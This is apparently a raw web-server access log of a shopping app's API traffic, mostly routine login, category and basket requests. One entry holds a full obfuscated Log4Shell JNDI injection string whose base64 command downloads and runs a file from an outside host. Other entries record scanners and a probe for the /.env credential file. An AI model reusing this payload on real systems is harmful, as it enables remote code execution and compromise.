::ffff:127.0.0.1 - - [28/Jun/2022:00:08:34 +0000] "GET / HTTP/1.0" 404 139 "-" "-"
::1 - - [28/Jun/2022:00:25:34 +0000] "GET / HTTP/1.0" 404 139 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7"
::ffff:127.0.0.1 - - [28/Jun/2022:00:30:46 +0000] "GET / HTTP/1.0" 404 139 "-" "Mozilla/5.0 zgrab/0.x"
::1 - - [28/Jun/2022:01:40:08 +0000] "GET / HTTP/1.0" 404 139 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36"
::ffff:127.0.0.1 - - [28/Jun/2022:01:42:01 +0000] "GET / HTTP/1.0" 404 139 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
::1 - - [28/Jun/2022:01:59:39 +0000] "POST /api/v1/users HTTP/1.0" 200 342 "-" "okhttp/4.9.2"
::1 - - [28/Jun/2022:01:59:40 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 401 283 "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [28/Jun/2022:01:59:40 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 401 283 "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [28/Jun/2022:01:59:40 +0000] "GET /api/v1/categories HTTP/1.0" 200 407 "-" "okhttp/4.9.2"
::1 - - [28/Jun/2022:02:01:53 +0000] "POST /api/v1/users/login HTTP/1.0" 200 542 "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [28/Jun/2022:02:01:54 +0000] "GET /api/v1/categories HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [28/Jun/2022:02:01:54 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 200 107 "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [28/Jun/2022:02:01:54 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 200 107 "-" "okhttp/4.9.2"
::1 - - [28/Jun/2022:02:02:13 +0000] "GET /api/v1/categories HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [28/Jun/2022:02:02:13 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [28/Jun/2022:02:02:23 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [28/Jun/2022:02:02:29 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [28/Jun/2022:02:02:29 +0000] "GET /api/v1/goods/user?limit=100&select=quantity%20price%20photo%20name HTTP/1.0" 200 107 "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [28/Jun/2022:02:02:34 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [28/Jun/2022:02:02:37 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [28/Jun/2022:02:02:37 +0000] "GET /api/v1/categories HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [28/Jun/2022:02:02:46 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [28/Jun/2022:02:02:52 +0000] "GET /api/v1/categories HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [28/Jun/2022:02:02:52 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [28/Jun/2022:02:03:00 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [28/Jun/2022:02:03:22 +0000] "GET /api/v1/categories HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [28/Jun/2022:02:03:22 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [28/Jun/2022:02:03:27 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [28/Jun/2022:02:03:28 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [28/Jun/2022:02:03:35 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [28/Jun/2022:02:06:03 +0000] "GET /.env HTTP/1.0" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::1 - - [28/Jun/2022:02:06:03 +0000] "POST / HTTP/1.0" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:127.0.0.1 - - [28/Jun/2022:02:10:11 +0000] "GET /api/v1/categories HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [28/Jun/2022:02:10:11 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [28/Jun/2022:02:10:36 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [28/Jun/2022:02:10:48 +0000] "GET /api/v1/categories HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [28/Jun/2022:02:10:48 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [28/Jun/2022:02:10:51 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [28/Jun/2022:02:11:29 +0000] "GET /api/v1/categories HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [28/Jun/2022:02:11:29 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [28/Jun/2022:02:12:12 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [28/Jun/2022:02:13:16 +0000] "POST /api/v1/users/login HTTP/1.0" 200 542 "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [28/Jun/2022:02:13:21 +0000] "POST /api/v1/users/login HTTP/1.0" 200 542 "-" "okhttp/4.9.2"
::1 - - [28/Jun/2022:02:13:22 +0000] "GET /api/v1/categories HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [28/Jun/2022:02:13:22 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [28/Jun/2022:02:13:22 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [28/Jun/2022:02:13:28 +0000] "GET /api/v1/categories HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [28/Jun/2022:02:13:28 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [28/Jun/2022:02:13:31 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [28/Jun/2022:02:16:55 +0000] "GET / HTTP/1.0" 404 139 "-" "Mozilla/5.0 zgrab/0.x"
::ffff:127.0.0.1 - - [28/Jun/2022:02:27:39 +0000] "GET / HTTP/1.0" 404 139 "-" "python-requests/2.28.0"
::1 - - [28/Jun/2022:02:30:19 +0000] "GET / HTTP/1.0" 404 139 "t('${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//150.136.111.68:1389/TomcatBypass/Command/Base64/d2dldCBodHRwOi8vMTQwLjIzOC4xODAuMzQvbWFrZWZpbGU4OyBjdXJsIC1PIGh0dHA6Ly8xNDAuMjM4LjE4MC4zNC9tYWtlZmlsZTg7IGNobW9kIDc3NyBtYWtlZmlsZTg7IC4vbWFrZWZpbGU4IHJ1bm5lcg==}')" "t('${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//150.136.111.68:1389/TomcatBypass/Command/Base64/d2dldCBodHRwOi8vMTQwLjIzOC4xODAuMzQvbWFrZWZpbGU4OyBjdXJsIC1PIGh0dHA6Ly8xNDAuMjM4LjE4MC4zNC9tYWtlZmlsZTg7IGNobW9kIDc3NyBtYWtlZmlsZTg7IC4vbWFrZWZpbGU4IHJ1bm5lcg==}')"
::1 - - [28/Jun/2022:02:43:54 +0000] "POST /api/v1/users HTTP/1.0" 200 341 "-" "okhttp/4.9.2"
::1 - - [28/Jun/2022:02:43:55 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 401 283 "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [28/Jun/2022:02:43:55 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 401 283 "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [28/Jun/2022:02:43:55 +0000] "GET /api/v1/categories HTTP/1.0" 200 407 "-" "okhttp/4.9.2"
::1 - - [28/Jun/2022:02:47:46 +0000] "POST /api/v1/users/login HTTP/1.0" 200 541 "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [28/Jun/2022:02:47:54 +0000] "POST /api/v1/users/login HTTP/1.0" 200 541 "-" "okhttp/4.9.2"
::1 - - [28/Jun/2022:02:48:15 +0000] "POST /api/v1/users/login HTTP/1.0" 200 541 "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [28/Jun/2022:02:48:35 +0000] "POST /api/v1/users/login HTTP/1.0" 200 542 "-" "okhttp/4.9.2"
::1 - - [28/Jun/2022:02:48:38 +0000] "POST /api/v1/users/login HTTP/1.0" 200 542 "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [28/Jun/2022:02:48:56 +0000] "POST /api/v1/users/login HTTP/1.0" 200 542 "-" "okhttp/4.9.2"
::1 - - [28/Jun/2022:02:49:08 +0000] "POST /api/v1/users/login HTTP/1.0" 200 542 "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [28/Jun/2022:02:49:42 +0000] "POST /api/v1/users/login HTTP/1.0" 200 542 "-" "okhttp/4.9.2"
::1 - - [28/Jun/2022:02:49:51 +0000] "POST /api/v1/users/login HTTP/1.0" 200 542 "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [28/Jun/2022:02:50:06 +0000] "POST /api/v1/users/login HTTP/1.0" 200 542 "-" "okhttp/4.9.2"
::1 - - [28/Jun/2022:02:50:10 +0000] "POST /api/v1/users/login HTTP/1.0" 200 542 "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [28/Jun/2022:02:50:47 +0000] "POST /api/v1/users/login HTTP/1.0" 200 547 "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [28/Jun/2022:02:51:18 +0000] "POST /api/v1/users/login HTTP/1.0" 200 547 "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [28/Jun/2022:02:52:05 +0000] "POST /api/v1/users/login HTTP/1.0" 200 547 "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [28/Jun/2022:02:52:06 +0000] "GET /api/v1/categories HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [28/Jun/2022:02:52:06 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 200 6420 "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [28/Jun/2022:02:52:06 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [28/Jun/2022:02:52:43 +0000] "POST /api/v1/users HTTP/1.0" 200 335 "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [28/Jun/2022:02:52:43 +0000] "GET /api/v1/categories HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [28/Jun/2022:02:52:43 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [28/Jun/2022:02:52:43 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [28/Jun/2022:02:53:08 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [28/Jun/2022:02:53:08 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [28/Jun/2022:02:53:34 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [28/Jun/2022:02:53:56 +0000] "POST /api/v1/users HTTP/1.0" 200 337 "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [28/Jun/2022:02:53:57 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [28/Jun/2022:02:53:57 +0000] "GET /api/v1/categories HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [28/Jun/2022:02:54:01 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [28/Jun/2022:02:54:01 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [28/Jun/2022:02:55:50 +0000] "POST /api/v1/users HTTP/1.0" 200 335 "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [28/Jun/2022:02:55:50 +0000] "GET /api/v1/categories HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [28/Jun/2022:02:55:50 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [28/Jun/2022:02:55:50 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [28/Jun/2022:02:55:52 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [28/Jun/2022:02:55:52 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [28/Jun/2022:02:56:30 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [28/Jun/2022:02:57:18 +0000] "POST /api/v1/users/login HTTP/1.0" 200 547 "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [28/Jun/2022:02:57:19 +0000] "GET /api/v1/categories HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [28/Jun/2022:02:57:19 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [28/Jun/2022:02:57:19 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [28/Jun/2022:02:57:29 +0000] "POST /api/v1/users HTTP/1.0" 500 253 "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [28/Jun/2022:02:57:34 +0000] "POST /api/v1/users HTTP/1.0" 200 337 "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [28/Jun/2022:02:57:35 +0000] "GET /api/v1/categories HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [28/Jun/2022:02:57:35 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [28/Jun/2022:02:57:35 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [28/Jun/2022:02:57:59 +0000] "GET /api/v1/categories HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [28/Jun/2022:02:57:59 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [28/Jun/2022:02:57:59 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [28/Jun/2022:03:17:58 +0000] "GET / HTTP/1.0" 404 139 "-" "-"
::1 - - [28/Jun/2022:03:19:25 +0000] "POST /api/v1/users/login HTTP/1.0" 200 542 "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [28/Jun/2022:03:19:25 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 200 107 "-" "okhttp/4.9.2"
::1 - - [28/Jun/2022:03:19:25 +0000] "GET /api/v1/categories HTTP/1.0" 200 407 "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [28/Jun/2022:03:19:25 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 200 107 "-" "okhttp/4.9.2"
::1 - - [28/Jun/2022:03:19:33 +0000] "GET /api/v1/categories HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [28/Jun/2022:03:19:33 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [28/Jun/2022:03:23:03 +0000] "POST /api/v1/users/login HTTP/1.0" 200 542 "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [28/Jun/2022:03:23:04 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [28/Jun/2022:03:23:04 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [28/Jun/2022:03:23:04 +0000] "GET /api/v1/categories HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [28/Jun/2022:03:23:09 +0000] "GET /api/v1/categories HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [28/Jun/2022:03:23:09 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [28/Jun/2022:03:26:15 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [28/Jun/2022:03:26:19 +0000] "GET /api/v1/categories HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [28/Jun/2022:03:26:19 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [28/Jun/2022:03:27:14 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [28/Jun/2022:03:32:01 +0000] "POST /api/v1/users/login HTTP/1.0" 200 547 "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [28/Jun/2022:03:32:01 +0000] "GET /api/v1/categories HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [28/Jun/2022:03:32:01 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [28/Jun/2022:03:32:01 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [28/Jun/2022:03:32:05 +0000] "GET /api/v1/categories HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [28/Jun/2022:03:32:05 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [28/Jun/2022:03:32:29 +0000] "GET /api/v1/categories HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [28/Jun/2022:03:32:43 +0000] "POST /api/v1/users/login HTTP/1.0" 200 547 "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [28/Jun/2022:03:32:44 +0000] "GET /api/v1/categories HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [28/Jun/2022:03:32:44 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [28/Jun/2022:03:32:44 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [28/Jun/2022:03:32:45 +0000] "POST /api/v1/users/login HTTP/1.0" 200 542 "-" "okhttp/4.9.2"
::1 - - [28/Jun/2022:03:32:46 +0000] "GET /api/v1/categories HTTP/1.0" 200 407 "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [28/Jun/2022:03:32:46 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 200 107 "-" "okhttp/4.9.2"
::1 - - [28/Jun/2022:03:32:46 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 200 107 "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [28/Jun/2022:03:32:52 +0000] "GET /api/v1/categories HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [28/Jun/2022:03:32:52 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [28/Jun/2022:03:33:17 +0000] "GET /api/v1/categories HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [28/Jun/2022:03:33:19 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [28/Jun/2022:03:33:20 +0000] "GET /api/v1/categories HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [28/Jun/2022:03:33:20 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [28/Jun/2022:03:38:03 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [28/Jun/2022:03:38:03 +0000] "GET /api/v1/categories HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [28/Jun/2022:03:38:30 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [28/Jun/2022:03:55:45 +0000] "GET / HTTP/1.0" 404 139 "-" "-"
::ffff:127.0.0.1 - - [28/Jun/2022:04:13:14 +0000] "POST /api/v1/users/login HTTP/1.0" 200 542 "-" "okhttp/4.9.2"
::1 - - [28/Jun/2022:04:13:15 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 200 107 "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [28/Jun/2022:04:13:15 +0000] "GET /api/v1/categories HTTP/1.0" 200 407 "-" "okhttp/4.9.2"
::1 - - [28/Jun/2022:04:13:15 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 200 107 "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [28/Jun/2022:04:13:20 +0000] "GET /api/v1/categories HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [28/Jun/2022:04:13:20 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [28/Jun/2022:04:15:04 +0000] "POST /api/v1/users/login HTTP/1.0" 200 542 "-" "okhttp/4.9.2"
::1 - - [28/Jun/2022:04:15:05 +0000] "GET /api/v1/categories HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [28/Jun/2022:04:15:05 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [28/Jun/2022:04:15:05 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [28/Jun/2022:04:15:07 +0000] "GET /api/v1/categories HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [28/Jun/2022:04:15:07 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [28/Jun/2022:04:22:09 +0000] "GET / HTTP/1.0" 404 139 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
::1 - - [28/Jun/2022:04:23:25 +0000] "POST /api/v1/users/login HTTP/1.0" 200 542 "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [28/Jun/2022:04:23:26 +0000] "GET /api/v1/categories HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [28/Jun/2022:04:23:26 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [28/Jun/2022:04:23:26 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [28/Jun/2022:04:23:44 +0000] "GET /api/v1/categories HTTP/1.0" 304 - "-" "okhttp/4.9.2"
